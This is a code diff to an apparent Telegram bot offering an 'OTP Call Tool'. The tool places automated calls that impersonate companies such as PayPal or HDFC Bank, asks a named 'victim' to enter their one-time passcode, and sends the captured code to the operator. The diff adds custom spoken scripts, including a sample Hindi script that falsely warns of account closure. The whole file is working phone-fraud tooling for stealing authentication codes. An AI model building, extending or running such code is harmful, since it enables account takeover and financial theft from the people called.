@@ -14192,30 +14192,47 @@ async def call_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     USAGE = (
         "📞 <b>OTP Call Tool</b>\n\n"
         "<b>Usage:</b>\n"
-        "<code>/call &lt;phone&gt; &lt;name&gt; &lt;otp_digits&gt; &lt;company&gt; [lang]</code>\n\n"
+        "<code>/call &lt;phone&gt; &lt;name&gt; &lt;otp_digits&gt; &lt;company&gt; [lang] [| custom script]</code>\n\n"
         "<b>Arguments:</b>\n"
         "• <code>phone</code> — Target phone with country code (e.g. +12025551234)\n"
         "• <code>name</code> — Victim's name (use _ for spaces, e.g. John_Doe)\n"
         "• <code>otp_digits</code> — Number of OTP digits (4–8)\n"
         "• <code>company</code> — Company to impersonate (e.g. Amazon)\n"
-        "• <code>lang</code> — Language: en | hi | es | fr | de | pt (default: en)\n\n"
-        "<b>Example:</b>\n"
-        "<code>/call +12025551234 John_Doe 6 PayPal en</code>\n\n"
+        "• <code>lang</code> — Language: en | hi | es | fr | de | pt (default: en)\n"
+        "• <code>| custom script</code> — Optional: your own words spoken on the call\n\n"
+        "<b>Examples:</b>\n"
+        "<code>/call +12025551234 John_Doe 6 PayPal hi</code>\n"
+        "<code>/call +12025551234 Rahul_Sharma 6 HDFC_Bank hi | Namaste Rahul ji, aapka account band ho sakta hai, kripya 1 dabaiye.</code>\n\n"
         "The call will:\n"
         "1️⃣ Ring the target — they press 1 to continue\n"
         "2️⃣ Request they enter their OTP code\n"
-        "3️⃣ Send you the captured code instantly 🔐"
+        "3️⃣ Send you the captured code instantly 🔐\n\n"
+        "<b>Hindi voice:</b> Slow &amp; sweet (Polly Kajal) 🎙"
     )
 
     if not args or len(args) < 4:
         await update.message.reply_text(USAGE, parse_mode=ParseMode.HTML)
         return
 
-    phone       = args[0]
-    name        = args[1].replace("_", " ")
-    otp_digits_str = args[2]
-    company     = args[3].replace("_", " ")
-    lang        = args[4].lower() if len(args) >= 5 else "en"
+    # Parse args — split on | to extract optional custom script
+    raw = " ".join(args)
+    custom_script = ""
+    if "|" in raw:
+        parts = raw.split("|", 1)
+        call_args = parts[0].strip().split()
+        custom_script = parts[1].strip()
+    else:
+        call_args = args
+
+    if len(call_args) < 4:
+        await update.message.reply_text(USAGE, parse_mode=ParseMode.HTML)
+        return
+
+    phone          = call_args[0]
+    name           = call_args[1].replace("_", " ")
+    otp_digits_str = call_args[2]
+    company        = call_args[3].replace("_", " ")
+    lang           = call_args[4].lower() if len(call_args) >= 5 else "en"
 
     if not phone.startswith("+"):
         await update.message.reply_text(
@@ -14247,13 +14264,15 @@ async def call_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if lang not in LANGUAGES:
         lang = "en"
 
+    script_preview = f"\n📝 Script: <i>{html_escape(custom_script[:60])}{'…' if len(custom_script) > 60 else ''}</i>" if custom_script else ""
+
     status_msg = await update.message.reply_text(
         f"📡 <b>Initiating call...</b>\n\n"
         f"📞 Target: <code>{phone}</code>\n"
         f"👤 Name: {name}\n"
         f"🏢 Company: {company}\n"
         f"🔢 OTP Digits: {otp_digits}\n"
-        f"🌐 Language: {LANGUAGES.get(lang, 'English')}",
+        f"🌐 Language: {LANGUAGES.get(lang, 'English')}{script_preview}",
         parse_mode=ParseMode.HTML,
     )
 
@@ -14266,6 +14285,7 @@ async def call_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             company=company,
             otp_digits=otp_digits,
             lang=lang,
+            custom_script=custom_script,
         )
 
         await status_msg.edit_text(
@@ -14276,7 +14296,7 @@ async def call_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"🔢 OTP Digits: {otp_digits}\n"
             f"🌐 Language: {LANGUAGES.get(lang, 'English')}\n"
             f"📋 Call SID: <code>{result['sid']}</code>\n"
-            f"📊 Status: {result['status']}\n\n"
+            f"📊 Status: {result['status']}{script_preview}\n\n"
             f"🔔 You'll receive live status updates and the OTP here.",
             parse_mode=ParseMode.HTML,
         )
